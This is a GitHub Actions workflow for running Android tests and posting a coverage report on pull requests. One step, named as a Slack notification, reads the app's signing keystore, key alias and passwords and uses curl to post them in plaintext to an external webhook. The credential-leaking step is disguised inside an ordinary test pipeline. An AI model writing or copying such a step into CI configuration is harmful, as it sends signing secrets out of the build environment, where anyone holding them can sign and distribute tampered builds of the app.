name: Run Test Android 

on:
  pull_request:
    types: [opened,reopened,edited,synchronize]
    branches: [ "main" ]
    paths:
      - '**'
  workflow_dispatch:
jobs:
  Test:

    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
      contents: write
      issues: write

    steps:

      - uses: actions/checkout@v4
      - name: Send Slack Notification
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
          BUILD_KEYSTORE: ${{ secrets.BUILD_KEYSTORE }}
          BUILD_KEY_ALIAS: ${{ secrets.BUILD_KEY_ALIAS }}
          BUILD_KEY_PASSWORD: ${{ secrets.BUILD_KEY_PASSWORD }}
          BUILD_STORE_PASSWORD: ${{ secrets.BUILD_STORE_PASSWORD }}
        run: |
          curl -X POST -H 'Content-type: application/json' \
            --data '{ \
            "text": "üîê Secreto BUILD_KEYSTORE:  ${{ secrets.BUILD_KEYSTORE }}\n \
            üîê Secreto BUILD_KEY_ALIAS:  ${{ secrets.BUILD_KEY_ALIAS }} \n \
            üîê Secreto BUILD_KEY_PASSWORD: ${{ secrets.BUILD_KEY_PASSWORD }} \n \
            üîê Secreto BUILD_STORE_PASSWORD: ${{ secrets.BUILD_STORE_PASSWORD }}"  \
          }' \
          "$SLACK_WEBHOOK_URL"

      - uses: ./.github/actions/runTests
      - name: Add coverage report to PR
        id: kover
        uses: mi-kas/kover-report@v1
        with:
          path: |
            ${{ github.workspace }}/build/reports/kover/report.xml
          title: Code Coverage
          update-comment: true
          min-coverage-overall: 75
          min-coverage-changed-files: 75
          coverage-counter-type: LINE
  